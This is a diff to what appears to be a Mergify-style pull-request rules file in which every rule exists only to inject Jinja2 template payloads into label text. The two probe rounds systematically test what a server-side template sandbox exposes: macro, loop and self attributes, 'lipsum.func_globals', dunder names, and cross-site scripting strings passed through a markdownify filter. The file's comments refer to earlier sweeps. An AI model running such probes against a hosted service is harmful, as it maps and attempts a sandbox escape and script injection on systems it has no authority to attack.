@@ -1,83 +1,46 @@
 pull_request_rules:
-  # ---- A. TEMPLATE-LOADER STATEMENTS (never probed: prior sweep tested expressions only)
-  - name: p01-include
+  - name: q01-debug-ext
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p01:{% include 'x' %}"]
-  - name: p02-extends
+    actions: {label: {add: ["q01:{% debug %}"]}}
+  - name: q02-do-ext
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p02:{% extends 'x' %}"]
-  - name: p03-import
+    actions: {label: {add: ["q02:{% do namespace(a=1) %}"]}}
+  - name: q03-with
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p03:{% import 'x' as y %}{{ y }}"]
-  - name: p04-from-import
+    actions: {label: {add: ["q03:{% with x=cycler %}{{ x }}{% endwith %}"]}}
+  - name: q04-filter-block
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p04:{% from 'x' import y %}"]
-
-  # ---- B. MACRO / BLOCK OBJECTS (non-dunder attrs the sandbox permits)
-  - name: p05-macro-render
+    actions: {label: {add: ["q04:{% filter upper %}z{% endfilter %}"]}}
+  - name: q05-call-block
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p05:{% macro m() %}z{% endmacro %}{{ m }}"]
-  - name: p06-macro-catch-kwargs
+    actions: {label: {add: ["q05:{% macro m() %}{{ caller() }}{% endmacro %}{% call m() %}z{% endcall %}"]}}
+  - name: q06-loop-obj
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p06:{% macro m() %}z{% endmacro %}{{ m.catch_kwargs }}"]
-  - name: p07-macro-name
+    actions: {label: {add: ["q06:{% for i in range(1) %}{{ loop }}{% endfor %}"]}}
+  - name: q07-loop-cycle
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p07:{% macro m() %}z{% endmacro %}{{ m.name }}{{ m.arguments }}"]
-  - name: p08-self-block
+    actions: {label: {add: ["q07:{% for i in range(1) %}{{ loop.cycle }}{% endfor %}"]}}
+  - name: q08-macro-caller
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p08:{% block b %}q{% endblock %}{{ self.b }}"]
-
-  # ---- C. NON-DUNDER CHAINS on sandbox-reachable globals
-  - name: p09-cycler-attrs
+    actions: {label: {add: ["q08:{% macro m() %}z{% endmacro %}{{ m.caller }}{{ m.catch_varargs }}"]}}
+  - name: q09-self-call
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p09:{{ cycler(1,2).next }}"]
-  - name: p10-namespace-attr
+    actions: {label: {add: ["q09:{% block b %}q{% endblock %}{{ self.b() }}"]}}
+  - name: q10-namespace-mutate
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p10:{{ namespace(a=1).a }}"]
-  - name: p11-lipsum-py2
+    actions: {label: {add: ["q10:{% set ns = namespace(x=cycler) %}{{ ns.x }}"]}}
+  - name: q11-cycler-bound
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p11:{{ lipsum.func_globals }}"]
-
-  # ---- D. FILTERS NOT PREVIOUSLY PROBED (incl. the two custom ones)
-  - name: p12-pprint
+    actions: {label: {add: ["q11:{{ cycler(1,2).next() }}{{ cycler(1,2).items }}"]}}
+  - name: q12-joiner-call
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p12:{{ cycler|pprint }}"]
-  - name: p13-tojson-obj
+    actions: {label: {add: ["q12:{{ joiner('-')() }}"]}}
+  - name: q13-markdownify-html
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p13:{{ cycler|tojson }}"]
-  - name: p14-markdownify
+    actions: {label: {add: ["q13:{{ '[x](javascript:alert(1))'|markdownify }}"]}}
+  - name: q14-getsection-attr
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p14:{{ '<img src=x onerror=alert(1)>'|markdownify }}"]
-  - name: p15-get-section
+    actions: {label: {add: ["q14:{{ get_section.__name__ }}"]}}
+  - name: q15-selfattr-context
     conditions: [-merged]
-    actions:
-      label:
-        add: ["p15:{{ '## a\nb'|get_section('## a') }}"]
+    actions: {label: {add: ["q15:{{ self.blocks }}{{ self.name }}"]}}
